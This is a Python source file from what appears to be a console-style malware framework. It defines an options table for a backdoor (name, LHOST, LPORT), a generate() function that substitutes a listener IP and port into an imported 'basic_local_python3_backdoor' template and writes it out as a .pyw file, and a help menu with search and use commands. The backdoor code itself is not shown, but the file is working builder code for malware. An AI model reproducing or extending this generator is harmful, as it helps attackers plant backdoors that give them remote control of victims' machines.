from modules import style
from malware import basic_local_python3_backdoor

global lhost
global lport
global lhost
global lport
global malw_name
global name
lhost = ''
lport = ''
rhost = ''
rport = ''
malw_name = ''
def_name = 'backdoor.pyw'



def local_backdoor_options(lhost, lport, name):
	if name == '':
		name = def_name
	return '''
Options
=======

   Name    Required    Description     Current Setting
   ----    --------    -----------     ---------------
   name    no          Backdoor Name   %s  
   LHOST   yes         Target Host     %s
   LPORT   yes         Target Port     %s
''' %(name, lhost, lport)
	

def generate(file, lhost, lport, name):
	code = basic_local_python3_backdoor.code.replace('^IP^', lhost).replace('^PORT^', lport)
	if name == '':
		name = def_name
	f = open(name, 'w+')
	f.write(code)
	f.close()
	print(style.WHITE+'[ '+style.GREEN+'#'+style.WHITE+' ] Backdoor Successfully Generated!')

help = '''
Generals
========									
   
    Command       Description
    -------       -----------
    search        Searches module names and descriptions
    use           Use a module
    help          Get help 
    exit          Close programm

'''

